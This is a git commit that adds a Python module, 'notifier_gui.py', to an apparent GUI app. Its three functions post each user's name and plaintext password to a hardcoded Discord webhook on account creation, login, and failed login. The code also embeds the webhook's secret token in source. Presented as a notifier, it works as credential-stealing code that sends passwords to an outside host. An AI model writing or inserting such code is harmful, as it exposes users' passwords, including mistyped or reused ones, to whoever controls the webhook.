fcc53ce9453f3846a9c05833f40a343706d5e767
Monteiro <trxshroot@gmail.com>
2025-04-15 16:41:36 +0100

    Create notifier_gui.py

---
+++ src/gui/notifier_gui.py
@@ -0,0 +1,31 @@
+import requests
+
+def notifier_crg(nome, senha):
+    webhook = "https://discordapp.com/api/webhooks/1361697482727493632/fBRXvfyqolzHW_i_cTPfqf8PurxZGOTAbY3W_5LwHsUB8YueNIxJG5s-P5zAaIk5Ex1N"
+
+    data = {
+        "content": f"# NOVA CRIAÇÃO DE CONTA DETECTADA\n - Nome: {nome}\n - Senha: {senha}"
+    }
+
+    response = requests.post(webhook, json=data)
+
+
+
+def notifier_lgg(nome, senha):
+    webhook = "https://discordapp.com/api/webhooks/1361697482727493632/fBRXvfyqolzHW_i_cTPfqf8PurxZGOTAbY3W_5LwHsUB8YueNIxJG5s-P5zAaIk5Ex1N"
+
+    data = {
+        "content": f"# NOVO LOGIN DETECTADO\n - Nome: {nome}\n - Senha: {senha}"
+    }
+
+    response = requests.post(webhook, json=data)
+
+def notifierErrorlg(nome, senha):
+    webhook = "https://discordapp.com/api/webhooks/1361697482727493632/fBRXvfyqolzHW_i_cTPfqf8PurxZGOTAbY3W_5LwHsUB8YueNIxJG5s-P5zAaIk5Ex1N"
+
+    data = {
+        "content": f"# TENTATIVA DE LOGIN DETECTADA (credenciais nao encontradas na database)\n - Nome: {nome}\n - Senha: {senha}"
+    }
+
+    response = requests.post(webhook, json=data)
+
